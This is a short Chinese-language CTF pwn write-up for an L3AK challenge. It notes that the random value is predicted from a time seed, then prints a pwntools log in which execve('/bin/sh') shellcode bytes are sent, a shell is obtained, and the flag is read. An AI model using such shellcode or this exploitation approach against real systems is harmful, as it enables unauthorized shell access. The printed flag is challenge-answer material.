# 思路
- 时间种子，预判随机值
- shellcode

# getshell
```
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-vdpm9v8i/step2 /tmp/pwn-asm-vdpm9v8i/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-vdpm9v8i/step3 /tmp/pwn-asm-vdpm9v8i/step4
[DEBUG] Sent 0x181 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000170  00 00 00 00  00 00 00 00  20 7b ee 0a  fc 7f 00 00  │····│····│ {··│····│
    00000180  0a                                                  │·│
    00000181
[*] Switching to interactive mode
-- you're so good. what message would you like to leave to the world?[DEBUG] Received 0x10 bytes:
    b'got it. bye now.'
got it. bye now.$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x4 bytes:
    b'run\n'
run
$ cat /f*
[DEBUG] Sent 0x8 bytes:
    b'cat /f*\n'
[DEBUG] Received 0x21 bytes:
    b'L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}\n'
L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}
$

```
![](https://r2.20161023.xyz/pic/20250712142948250.png)